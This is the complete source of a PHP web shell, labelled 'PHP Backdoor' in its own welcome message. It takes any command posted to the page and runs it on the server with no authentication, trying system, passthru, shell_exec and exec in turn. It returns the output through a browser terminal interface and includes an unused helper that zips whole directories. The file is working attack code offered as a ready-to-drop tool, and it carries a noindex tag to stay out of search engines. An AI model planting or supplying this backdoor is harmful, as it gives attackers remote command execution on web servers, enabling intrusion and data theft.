<?php if (isset( $_POST['command'])): $command = $_POST['command']; $command = trim($command," "); else: $command = ''; endif; function answer($data){ die(json_encode($data)); } function archive($path){ $rootPath = $path; $zip = new ZipArchive(); $zip->open('file.zip', ZipArchive::CREATE | ZipArchive::OVERWRITE); /** @var SplFileInfo[] $files */ $files = new RecursiveIteratorIterator( new RecursiveDirectoryIterator($rootPath), RecursiveIteratorIterator::LEAVES_ONLY ); foreach ($files as $name => $file) { if (!$file->isDir()) { $filePath = $file->getRealPath(); $relativePath = substr($filePath, strlen($rootPath) + 1); $zip->addFile($filePath, $relativePath); } } $zip->close(); $answer = array("Archive created"); answer($answer); } if (isset( $_POST['command'])): $command = $_POST['command']; if(function_exists('system')) { ob_start(); system($command , $return_var); $output = ob_get_contents(); ob_end_clean(); } else if(function_exists('passthru')) { ob_start(); passthru($command , $return_var); $output = ob_get_contents(); ob_end_clean(); } else if(function_exists('shell_exec')) { $output = shell_exec($command); } else if(function_exists('exec')) { exec($command , $output , $return_var); $output = implode("" , $output); } else if(function_exists('terminal_exec')) { $output = terminal_exec($command) ; } else { $output = 'Command execution not possible on this server'; } if ($output == null): $answer = array( 'Unknown command', ); answer($answer); else: $output = nl2br($output); $answer = array( $output ); answer($answer); endif; else: ?><!doctype html><html lang="en"><head><meta charset="utf-8"><meta name="language" content="en"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="robots" CONTENT="noindex,nofollow"><meta name="distribution" content="IU"><meta name="copyright" content="G3ck Dev Team, dev@g3ck.com"><meta name="author" content="Jarek, jarek@g3ck.com"><meta name="author" content="Jarek, jarek@g3ck.com"><meta name="owner" content="G3ck Dev Team, dev@g3ck.com"><title>PHP Terminal [g3ck.com]</title><style>*{font-family:monospace}body,html{height:100%;background:#000;font-size:15px;color:#fff;padding:0;margin:0;overflow:hidden}body{overflow-x:hidden;overflow-y:auto}section#terminal{margin:15px}#console{list-style:none;padding:0;margin:0}#console li{position:relative;width:99%;border:none;color:#fff;margin-bottom:1px;color:#1dff1d;padding:2px 0 2px 15px;cursor:default!important}#console li::before{content:" ~ ";position:absolute;left:0;top:1px;color:green}#console li.answer{color:#ffd623;font-weight:400}#console li.answer.error{color:#ff2323}#input{padding:2px 0 2px 15px;position:relative}#input::before{content:" ~ ";position:absolute;left:0;top:1px;color:green}#input::before{transition-property:transform;transition-duration:1s}#input.waiting::before{animation-name:rotate;animation-duration:2s;animation-iteration-count:infinite;animation-timing-function:linear;color:#fff}@keyframes rotate{from{transform:rotate(0)}to{transform:rotate(360deg)}}#input #command{width:100%;background-color:transparent;border:none;color:#fff;font-size:15px;color:#fff;font-family:'Roboto Mono',monospace}</style></head><body><section id="terminal"><ul id="console"></ul><div id="input"><input id="command" type="text" value=""></div></section><script>function log(e){document.getElementById("console").innerHTML+="<li>"+e+"</li>"}function answer(e,n=""){document.getElementById("console").innerHTML+='<li class="answer '+n+'">'+e+"</li>"}function welcome(){var e=document.getElementById("console");e.innerHTML+='<li class="answer">PHP Backdoor by G3ck.com</li>',e.innerHTML+='<li class="answer">Licensed under MIT License</li>'}function ajax(e){document.getElementById("console");var n=new XMLHttpRequest;n.onreadystatechange=function(){if(4==this.readyState&&200==this.status){if(respond=this.responseText,function(e){try{return"object"==typeof JSON.parse(e)}catch(e){return!1}}(respond))for(var e in respond=JSON.parse(respond),respond)respond.hasOwnProperty(e)&&(displayed=!0,answer(respond[e]));else answer("Unexpected response format")}},n.open("POST",window.location.href,!0),n.setRequestHeader("Content-type","application/x-www-form-urlencoded"),n.send("command="+e)}welcome(),document.getElementById("command").addEventListener("keyup",function(e){var n=document.getElementById("command").value;if(13==e.keyCode)return""!=(n=n.toLowerCase())&&(log(n),"cls"==n?document.getElementById("console").innerHTML="":"reset"==n||"res"==n?(document.getElementById("console").innerHTML="",welcome()):"hello"==n||"hi"==n?answer("Hello"):ajax(n),window.scrollTo(0,document.body.scrollHeight),document.getElementById("command").value=""),!1}),document.getElementById("command").value="",setInterval(function(){document.getElementById("command").focus()},500);
</script></body></html><?php endif; ?>
